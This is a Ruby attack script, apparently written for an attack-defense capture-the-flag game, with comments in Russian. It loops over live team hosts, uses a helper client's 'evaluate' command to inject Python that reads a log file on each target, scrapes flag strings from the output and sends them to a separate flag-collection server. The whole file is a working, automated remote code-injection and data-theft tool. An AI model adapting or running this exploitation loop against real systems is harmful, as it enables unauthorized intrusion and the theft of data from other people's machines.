#!/usr/bin/env ruby
require 'socket'
require 'timeout'
require 'yaml'
require 'open-uri'

#########################################
#
#   сервис: ezpz
#    порты:
# алгоритм:
#
#########################################

OUR_HOST = '10.12.21.10'
FLAG_RE  = /^[a-f0-9]{16}$/i

# координаты нашей постилки флагов
POST_FLAGS_HOST = "10.12.21.21"
POST_FLAGS_PORT = 12321

#########################################

STDOUT.sync = true

@flags = []
@all_flags = {}

def _submit_flags
  socket = TCPSocket.new POST_FLAGS_HOST, POST_FLAGS_PORT
  socket.puts "id=ezpz"
  socket.gets
  socket.puts @flags.join("\n")
  socket.flush
  socket.close
  @flags = []
end

def submit_flags
  Timeout.timeout(60){ _submit_flags }
rescue
  puts "[!] #{__method__}: #{$!}"
end

def attack host
  ip = "10.12.#{host}.10"
  return if ip == OUR_HOST
  printf "[.] attacking %15s .. ", ip
  r = `./ezpz/ezclient.py #{ip} evaluate 'fl = open("/home/ezpz/log/ezlog","r"); print fl.read(); fl.close()'`
  flags = r.scan(/[a-fA-F0-9]{16}/).uniq
  printf "%3d flags, ", flags.size
  nnew = 0
  flags.each do |flag|
    unless @all_flags[flag]
      @all_flags[flag] = host
      @flags << flag
      nnew += 1
    end
  end
  printf "%3d new\n", nnew
rescue
  puts "[!] #{__method__}: #{$!}"
end

def get_live_hosts
  data = open("http://10.12.250.1/json/up").read
  data.strip.split("\n").each do |line|
    next unless line[/^ezpz:/]
    line.gsub!('ezpz:','')
    line.strip!
    return line.split(",").map(&:to_i)
  end
  []
rescue
  puts "[!] #{__method__}: #{$!}"
  []
end

while true do
  hosts = get_live_hosts
  hosts.each do |host|
    begin
      Timeout.timeout(60){
        attack host
      }
    rescue
      puts "[!] #{$!}"
    end
    submit_flags if @flags.any?
  end
  sleep 10
end
